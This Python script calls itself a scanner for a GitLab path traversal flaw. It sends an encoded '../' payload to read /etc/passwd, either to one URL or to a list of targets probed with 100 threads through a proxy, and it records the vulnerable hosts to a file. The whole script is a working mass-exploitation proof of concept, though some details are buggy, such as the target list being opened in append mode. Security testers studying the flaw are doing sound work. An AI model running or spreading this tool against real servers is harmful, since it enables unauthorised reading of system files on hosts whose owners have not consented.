import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | 'gitlab路径遍历读取任意文件'漏洞安全漏洞扫描工具                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-9-13  
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

"""
    print(test)
def poc(target):
    payload = "GET /group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    proxies = {
        'http': 'http://127.0.0.1:1080',
        'https': 'http://127.0.0.1:1080',
    }
    try:
        res1 = requests.get(url=target + payload, timeout=10, verify=False, proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result51.txt', 'a', encoding='utf-8') as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')


def main():
    banner()
    parser = argparse.ArgumentParser(description="gitlab路径遍历读取任意文件漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input your url')
    parser.add_argument("-f", "--file", dest='file',type=str,help="please input your file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url,)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'a',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: {sys.argv[0]} -u {args.url} -f {args.file}")


if __name__ == '__main__':
        main()